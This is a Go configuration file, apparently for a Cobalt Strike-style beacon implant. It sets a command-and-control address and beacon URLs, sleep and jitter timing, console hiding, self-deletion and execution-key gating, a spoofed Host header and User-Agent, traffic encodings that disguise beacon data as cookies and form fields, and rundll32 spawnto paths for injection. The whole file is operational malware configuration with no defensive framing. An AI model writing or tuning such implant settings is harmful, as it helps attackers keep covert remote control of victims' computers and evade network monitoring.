package config

import (
	"github.com/imroc/req"
	"time"
)

// basic settings
var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
	Here should be your publickey
-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA	
-----END PRIVATE KEY-----`)

	C2        = "ip:port"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = sslHTTP + C2 + Http_get_uri
	PostUrl   = sslHTTP + C2 + Http_post_uri
	//PostUrl   = sslHTTP + C2 + Http_post_uri + "?" + Http_post_id_header + "="
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV                 = []byte("abcdefghijklmnop")
	GlobalKey          []byte
	AesKey             []byte
	HmacKey            []byte
	Counter            = 0
	ComputerNameLength = 0
)

// personalized settings
var (
	ProxyOn = false
	Proxy   = "http://192.168.52.10:8080"

	CommandReadTime = 5000 * time.Millisecond
	//non-blocking lasting jobs

	//Sleep_mask = true
	DeleteSelf  = false
	HideConsole = true
	Remark      = ""
	//Remark = "test"
	ExecuteKey = ""
	//ExecuteKey = "password"
	ExecuteTime = ""
	//ExecuteTime = "2022-12-11 09:59:29" UTC time
)

// C2profile settings
var (
	WaitTime = 3000 * time.Millisecond

	Jitter = 7
	// % Jitter
	//0 <= Jitter <= 100

	HttpHeaders = req.Header{
		"Host":         "aliyun.com",
		"User-Agent":   "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Server":       "nginx",
		"Accept":       "*/*",
		"Content-Type": "text/html;charset=UTF-8",
	}

	Http_get_uri            = "/www/handle/doc"
	Http_get_metadata_crypt = []string{"base64url"}
	//Http_get_metadata_header = "Cookie"
	Http_get_metadata_prepend    = "SESSIONID="
	Http_get_metadata_type       = "header"
	Http_get_metadata_type_value = "Cookie"
	Http_get_output_crypt        = []string{"mask", "netbios"}
	Http_get_output_prepend      = "data="
	Http_get_output_append       = "%%"

	Http_post_uri = "/IMXo"
	//Http_post_id_header = "doc"
	Http_post_id_crypt                 = []string{"mask", "netbiosu"}
	Http_post_id_prepend               = "user="
	Http_post_id_append                = "%%"
	Http_post_id_type                  = "header"
	Http_post_id_type_value            = "User"
	Http_post_client_output_crypt      = []string{"mask", "base64url"}
	Http_post_client_output_prepend    = "data="
	Http_post_client_output_append     = "%%"
	Http_post_client_output_type       = "print"
	Http_post_client_output_type_value = "_data"
	Http_post_server_output_crypt      = []string{"mask", "netbios"}
	Http_post_server_output_prepend    = "data="
	Http_post_server_output_append     = "%%"

	Spawnto_x86 = "c:\\windows\\syswow64\\rundll32.exe"
	Spawnto_x64 = "c:\\windows\\system32\\rundll32.exe"
)

const (
	DebugMode = true
)
